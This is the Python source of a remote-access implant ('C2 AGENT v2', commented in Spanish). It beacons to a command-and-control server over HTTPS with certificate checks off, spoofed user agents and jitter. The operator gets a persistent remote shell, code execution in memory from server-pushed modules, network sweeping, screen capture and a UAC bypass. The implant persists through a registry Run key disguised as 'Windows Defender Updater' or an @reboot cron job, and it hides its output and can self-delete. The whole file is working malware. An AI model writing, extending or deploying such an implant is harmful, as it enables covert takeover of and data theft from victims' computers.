"""
╔══════════════════════════════════════════════════════════════╗
║        C2 AGENT v2 - ARQUITECTURA HTTP/HTTPS FILELESS        ║
╚══════════════════════════════════════════════════════════════╝
- Encriptación Dinámica RSA + AES por sesión (Nivel Empresa)
- Evasión SSL/TLS (Tráfico HTTPS)
- Perfiles Malleable C2 + Jittering Aleatorizado
"""

import urllib.request
import urllib.parse
import json
import base64
import os
import sys
import platform
import random
import time
import threading
import subprocess
import ssl
import queue

try:
    from Crypto.Cipher import AES, PKCS1_OAEP
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad
    import hashlib
    AES_AVAILABLE = True
except ImportError:
    AES_AVAILABLE = False

# =========================================================
# CONFIGURACIÓN DEL IMPLANTE
# =========================================================
C2_URL = "https://127.0.0.1:5000"
BEACON_INTERVAL = 5   
JITTER = 0.3          

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0)',
    'Spotify/1.1.56.595 (Windows NT 10.0; Win64; x64)'
]

# Permitir conexiones HTTPS Autofirmadas
ssl_context = ssl._create_unverified_context()

class AESCipher:
    def __init__(self, key: bytes):
        if AES_AVAILABLE:
            self.key = hashlib.sha256(key).digest() if len(key) != 32 else key
            
    def encrypt(self, plaintext: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in plaintext])
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        return base64.b64encode(iv + ciphertext)
    
    def decrypt(self, encrypted_data: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in encrypted_data])
        raw = base64.b64decode(encrypted_data)
        cipher = AES.new(self.key, AES.MODE_CBC, raw[:16])
        return unpad(cipher.decrypt(raw[16:]), AES.block_size)

class AgentV2:
    def __init__(self):
        self.agent_id = self._generate_id()
        self.cwd = os.getcwd()
        self.running = True
        self.beacon_interval = BEACON_INTERVAL
        self.jitter = JITTER
        
        self.injected_modules = {}
        # Generar llave AES única efímera
        self.aes_key = get_random_bytes(32) if AES_AVAILABLE else b'FallbackInsecureKey____'
        self.aes = AESCipher(self.aes_key)

        # === Módulo 1: Persistent PTY Asíncrona ===
        self.pty_queue = queue.Queue()
        shell_exe = "cmd.exe" if platform.system() == "Windows" else "/bin/bash"
        self.pty_process = subprocess.Popen(
            [shell_exe],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        self.pty_thread = threading.Thread(target=self._pty_reader, daemon=True)
        self.pty_thread.start()

    def _pty_reader(self):
        # Lee byte a byte del subproceso congelado sin bloquear el pipeline
        while self.running:
            try:
                byte = self.pty_process.stdout.read(1)
                if not byte: break
                codec = 'cp850' if platform.system() == 'Windows' else 'utf-8'
                self.pty_queue.put(byte.decode(codec, errors='replace'))
            except:
                break

    def _generate_id(self):
        return base64.b64encode(os.urandom(6)).decode('utf-8')
        
    def _get_ua(self):
        return random.choice(USER_AGENTS)

    def build_sysinfo(self):
        return {
            'id': self.agent_id,
            'hostname': platform.node(),
            'os': f"{platform.system()} {platform.release()}",
            'username': os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            'cwd': self.cwd
        }
        
    def encode_payload(self, data: dict) -> str:
        json_data = json.dumps(data).encode('utf-8')
        return self.aes.encrypt(json_data).decode('utf-8')

    def decode_payload(self, b64_encoded: str) -> dict:
        try:
            decrypted = self.aes.decrypt(b64_encoded)
            return json.loads(decrypted.decode('utf-8'))
        except Exception as e:
            return {'error': str(e)}

    def handshake(self):
        """Negocia la clave AES efímera con el servidor usando la PKI (Llave Pública)"""
        try:
            # 1. Obtener la llave Pública
            req = urllib.request.Request(f"{C2_URL}/api/v2/get_cert", headers={'User-Agent': self._get_ua()})
            with urllib.request.urlopen(req, context=ssl_context, timeout=10) as r:
                data = json.loads(r.read())
            pub_key_str = data.get('public_key')
            
            if pub_key_str and pub_key_str != "NO_RSA":
                if not AES_AVAILABLE:
                    print("[-] CRITICAL: PyCryptodome no está instalado. No se puede arrancar el túnel C2.")
                    sys.exit(1)
                
                server_pub_key = RSA.import_key(pub_key_str)
                rsa_cipher = PKCS1_OAEP.new(server_pub_key)
                encrypted_aes = rsa_cipher.encrypt(self.aes_key)
                payload = {
                    'id': self.agent_id,
                    'encrypted_aes': base64.b64encode(encrypted_aes).decode('utf-8'),
                    'info': self.build_sysinfo()
                }
            else:
                return
            
            # 2. Enviar la llave cifrada de vuelta (esto registra al agente en el C2)
            post_data = json.dumps(payload).encode('utf-8')
            req2 = urllib.request.Request(f"{C2_URL}/api/v2/handshake", data=post_data, headers={
                'Content-Type': 'application/json', 'User-Agent': self._get_ua()
            })
            urllib.request.urlopen(req2, context=ssl_context, timeout=10)
        except Exception as e:
            print(f"[-] FATAL ERROR IN HANDSHAKE: {str(e)}")
            import traceback
            traceback.print_exc()

    def check_in(self):
        safe_id = urllib.parse.quote(self.agent_id)
        url = f"{C2_URL}/api/v2/telemetry"
        headers = { 'User-Agent': self._get_ua(), 'Cookie': f'session_id={safe_id}' }
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, context=ssl_context, timeout=10) as response:
                content = response.read()
                
                # Flushing Asíncrono: Si el PTY está escupiendo texto (ej. scan Nmap)
                # se envía de vuelta inmediatamente en este Check-In.
                out_buffer = ""
                while True:
                    try: out_buffer += self.pty_queue.get_nowait()
                    except queue.Empty: break
                
                if out_buffer:
                    import uuid
                    self.send_response(f"pty_{uuid.uuid4().hex[:8]}", {'output': out_buffer})
                    
                if content:
                    payload = self.decode_payload(content)
                    if payload and 'command' in payload:
                        self.process_command(payload)
        except Exception:
            pass

    def send_response(self, task_id: str, data: dict):
        url = f"{C2_URL}/api/v2/update"
        data['id'] = self.agent_id
        data['task_id'] = task_id
        
        payload_str = self.encode_payload(data)
        post_data = urllib.parse.urlencode({'__VIEWSTATE': payload_str}).encode('utf-8')
        headers = {
            'User-Agent': self._get_ua(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': f'session_id={urllib.parse.quote(self.agent_id)}'
        }
        try:
            req = urllib.request.Request(url, data=post_data, headers=headers)
            urllib.request.urlopen(req, context=ssl_context, timeout=10)
        except Exception:
            pass

    def evaluate_in_memory(self, code_str: str, module_name: str):
        try:
            compiled_code = compile(code_str, '<string>', 'exec')
            module_globals = {}
            exec(compiled_code, module_globals)
            self.injected_modules[module_name] = module_globals
            return True
        except Exception as e:
            return str(e)

    def process_command(self, payload: dict):
        cmd_str = payload.get('command', '')
        task_id = payload.get('task_id', '0000')
        args = payload.get('args', '')
        
        if 'fileless_script' in payload:
            script_content = payload['fileless_script']
            mod_name = args 
            res = self.evaluate_in_memory(script_content, mod_name)
            if res is True:
                self.send_response(task_id, {'output': f'[+] Módulo {mod_name} cargado estáticamente en memoria RAM.'})
            else:
                self.send_response(task_id, {'error': f'[-] Error inyectando módulo: {res}'})
            return

        if cmd_str == 'register':
            pass # Ya manejado por handshake
        elif cmd_str == 'shell':
            try:
                # Escribir el comando a la sesión viva y flushear
                self.pty_process.stdin.write((args + "\n").encode('utf-8'))
                self.pty_process.stdin.flush()
                
                # Esperar 0.5s para captura inmediata
                time.sleep(0.5)
                out_buffer = ""
                while True:
                    try: out_buffer += self.pty_queue.get_nowait()
                    except queue.Empty: break
                
                self.send_response(task_id, {'output': out_buffer if out_buffer else '...'})
            except Exception as e:
                self.send_response(task_id, {'error': str(e)})
        elif cmd_str == 'sweep':
            if 'network_sweeper' in self.injected_modules:
                try:
                    sweeper_run = self.injected_modules['network_sweeper'].get('run_sweep')
                    if sweeper_run:
                        out = sweeper_run(args)
                        self.send_response(task_id, {'output': out})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
            else:
                self.send_response(task_id, {'error': 'Módulo network_sweeper no está inyectado.'})
        elif cmd_str == 'watch':
            if 'stream_capture' in self.injected_modules:
                try:
                    capture_fn = self.injected_modules['stream_capture'].get('capture_frame')
                    if capture_fn:
                        out = capture_fn(args)
                        if "error" in out:
                            self.send_response(task_id, {'error': out["error"]})
                        else:
                            self.send_response(task_id, {'vision_frame': out["data"], 'target': args})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
            else:
                self.send_response(task_id, {'error': 'Módulo stream_capture no inyectado.'})
        elif cmd_str == 'elevate':
            if 'uac_bypass' in self.injected_modules:
                try:
                    bypass_fn = self.injected_modules['uac_bypass'].get('run_uac_bypass')
                    if bypass_fn:
                        out = bypass_fn()
                        self.send_response(task_id, {'output': out})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
            else:
                self.send_response(task_id, {'error': 'Módulo uac_bypass no inyectado.'})
        elif cmd_str == 'persist':
            target_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            if platform.system() == 'Windows':
                try:
                    import winreg
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "Windows Defender Updater", 0, winreg.REG_SZ, f'"{target_exe}"')
                    winreg.CloseKey(key)
                    self.send_response(task_id, {'output': '[+] Clave de registro creada. (Persistencia Windows)'})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
            else:
                try:
                    cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot {target_exe}") | crontab -'
                    os.system(cron_cmd)
                    self.send_response(task_id, {'output': '[+] Cronjob inyectado.'})
                except Exception as e:
                    self.send_response(task_id, {'error': str(e)})
        elif cmd_str == 'sleep':
            try:
                parts = args.split()
                if len(parts) >= 1: self.beacon_interval = float(parts[0])
                if len(parts) >= 2: self.jitter = float(parts[1])
                self.send_response(task_id, {'output': f'[+] Control de Sleep: {self.beacon_interval}s, Jitter: {self.jitter}'})
            except Exception as e:
                self.send_response(task_id, {'error': str(e)})
        elif cmd_str == 'kill':
            self.send_response(task_id, {'output': '[+] Ejecutando auto-destrucción...'})
            self.running = False
            if platform.system() == 'Windows':
                try:
                    import winreg
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, "Windows Defender Updater")
                    winreg.CloseKey(key)
                except Exception:
                    pass
            script_path = os.path.abspath(__file__)
            if not getattr(sys, 'frozen', False):
                try:
                    os.system(f'start /b cmd /c ping 127.0.0.1 -n 3 > nul & del "{script_path}"')
                except:
                    pass
            sys.exit(0)
        else:
            self.send_response(task_id, {'error': 'Comando desconocido'})

    def run(self):
        # Asegurar comunicación de claves RSA
        self.handshake()
        print(f"[*] Agent {self.agent_id} secured with dynamic AES and initialized.")
        
        while self.running:
            self.check_in()
            sleep_time = self.beacon_interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(sleep_time)

if __name__ == '__main__':
    if platform.system() != 'Windows':
        import os
        try:
            if os.fork() > 0: sys.exit(0)
        except OSError:
            pass
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
    agent = AgentV2()
    agent.run()
